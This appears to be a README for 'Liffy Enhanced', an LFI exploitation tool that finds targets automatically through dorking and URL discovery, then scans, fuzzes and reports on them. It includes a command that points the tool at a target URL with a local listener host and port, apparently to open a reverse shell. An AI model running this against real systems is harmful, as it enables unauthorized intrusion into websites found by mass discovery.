# Liffy Enhanced - Ultimate LFI Exploitation Tool

## 🚀 New Features Added

### 1. Automatic Target Discovery System
- **Dorking Engine**: Advanced Google dorking with multiple search engines
- **GAU+ Integration**: URL discovery using GAU+ tool
- **GF Pattern Matching**: Parameter discovery using GF patterns
- **Bug Bounty Integration**: Load targets from ~/targets/scope/data
- **Random Target Selection**: Mix different discovery methods

### 2. Dry Run Mode
- **Automatic Hunting**: Run `python3 liffy_dry_run.py` with no arguments
- **Target Discovery**: Automatically finds LFI targets using multiple methods
- **Nuclei Scanning**: Scans targets with custom LFI nuclei templates
- **Fuzzing**: Performs basic LFI fuzzing with common payloads
- **Report Generation**: Creates detailed JSON reports

### 3. Tool Setup Automation
- **Log4j-scan**: Automatic setup from GitHub
- **Nuclei Templates**: Custom LFI detection templates
- **Configuration**: Automatic config file generation
- **Dependencies**: Checks and installs required tools

## 🛠️ Quick Start

### 1. Setup
```bash
# Install dependencies
pip3 install -r requirements.txt

# Setup tools and templates
python3 setup_tools.py
```

### 2. Dry Run Mode (Automatic Hunting)
```bash
# Start automatic target hunting
python3 liffy_dry_run.py
```

### 3. Traditional LFI Exploitation
```bash
# Use with specific targets
python3 liffy_dry_run.py --url "http://target.com/page.php?file=" --data --lhost 192.168.1.100 --lport 4444
```

## 📁 Files Added

- `liffy_dry_run.py` - Dry run mode wrapper
- `target_discovery.py` - Target discovery engine
- `hunt_mode.py` - Hunt mode implementation
- `setup_tools.py` - Tool setup automation

## 🎯 Features

- **Target Discovery**: Dorking, GAU+, GF patterns, bug bounty data
- **Nuclei Scanning**: Custom LFI detection templates
- **Fuzzing**: LFI payload testing
- **Reporting**: JSON reports with statistics
- **Auto Setup**: One-command tool installation

## ⚠️ Security Notice

Use only on authorized targets. Follow responsible disclosure practices.
